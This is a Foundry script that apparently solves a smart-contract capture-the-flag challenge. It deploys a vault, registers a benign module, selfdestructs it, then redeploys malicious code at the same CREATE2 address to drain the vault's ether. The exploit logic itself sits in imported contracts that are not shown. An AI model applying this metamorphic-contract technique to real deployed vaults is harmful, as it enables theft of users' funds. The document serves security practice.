// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Script.sol";
import "targets/sentinel/Challenge.sol";
import "targets/sentinel/EchoModule.sol";
import "targets/sentinel/interfaces/ISentinelVault.sol";
import "src/sentinel/SentinelAttack.sol";
import "src/sentinel/EchoModuleFactory.sol";

contract SentinelAttackScript is Script {
    function run() external {
        vm.startBroadcast();

        // --- Setup: deploy the challenge (mimics the CTF environment) ---
        EchoModule echoRef = new EchoModule();
        Challenge challenge = new Challenge{value: 1 ether}(address(echoRef));
        ISentinelVault vault = challenge.VAULT();

        console.log("Vault address:", address(vault));
        console.log("Vault balance before:", address(vault).balance);

        // Deploy the attacker orchestrator (persists across both phases)
        SentinelAttack attacker = new SentinelAttack();

        // Phase 1: deploy legit EchoModule, register, selfdestruct everything
        attacker.phase1(vault);

        vm.stopBroadcast();

        // ---------------------------------------------------------------
        // Forge simulates the entire script as one EVM execution context,
        // so selfdestruct hasn't taken effect yet. We use vm.etch to
        // manually clear the Factory and child code, simulating what
        // happens between real broadcast transactions (where selfdestruct
        // takes effect at end of each mined tx).
        //
        // This does NOT affect the actual broadcast — it only fixes the
        // local simulation so phase2 can proceed.
        // ---------------------------------------------------------------
        bytes32 salt = keccak256("sentinel");
        bytes32 factoryInitHash = keccak256(type(Factory).creationCode);
        address factoryAddr = vm.computeCreate2Address(salt, factoryInitHash, address(attacker));
        address childAddr = vm.computeCreateAddress(factoryAddr, 1);

        // Clear code at both addresses (simulate selfdestruct effect)
        vm.etch(factoryAddr, "");
        vm.etch(childAddr, "");
        // Reset nonces to 0 (selfdestruct resets nonce — both factory AND child)
        vm.setNonceUnsafe(factoryAddr, 0);
        vm.setNonceUnsafe(childAddr, 0);

        vm.startBroadcast();

        // Phase 2: redeploy malicious code at same addresses, drain vault
        attacker.phase2(vault, msg.sender);

        console.log("Vault balance after:", address(vault).balance);
        console.log("Solved:", challenge.isSolved());

        vm.stopBroadcast();
    }
}
